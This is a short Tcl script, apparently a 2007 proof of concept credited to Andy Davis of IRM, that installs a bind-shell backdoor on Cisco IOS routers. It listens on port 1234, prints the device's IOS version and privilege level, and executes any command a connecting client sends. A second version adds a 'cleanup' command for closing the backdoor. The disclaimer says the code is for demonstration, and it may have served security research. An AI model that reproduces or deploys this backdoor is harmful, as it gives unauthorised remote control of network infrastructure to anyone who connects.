# TclShell.tcl v0.1 by Andy Davis, IRM 2007
#
# IRM accepts no responsibility for the misuse of this code
# It is provided for demonstration purposes only
proc callback {sock addr port} {
fconfigure $sock -translation lf -buffering line
puts $sock " "
puts $sock "-------------------------------------"
puts $sock " "
set response [exec "sh ver | inc IOS"]
puts $sock $response
set response [exec "sh priv"]
puts $sock $response
puts $sock " "
puts $sock "Enter IOS command:"
fileevent $sock readable [list echo $sock]
}
proc echo {sock} {
global var
if {[eof $sock] || [catch {gets $sock line}]} {
} else {
set response [exec "$line"]
puts $sock $response
}
}
set port 1234
set sh [socket -server callback $port]
vwait var
close $sh


#
#
#
proc echo {sock} { 
    global var

    if {[catch {gets $sock line}] || 
        [eof $sock]} { 
        return [close $sock] 
    }

    # allow a special command to "clean up" 
    if {$line == "cleanup"} { 
        set var done 
        puts $sock "(closing backdoor...)" 
        return [close $sock] 
    }

    catch {exec $line} result 
    if {[catch {puts $sock $result}]} { 
        return [close $sock] 
    } 
}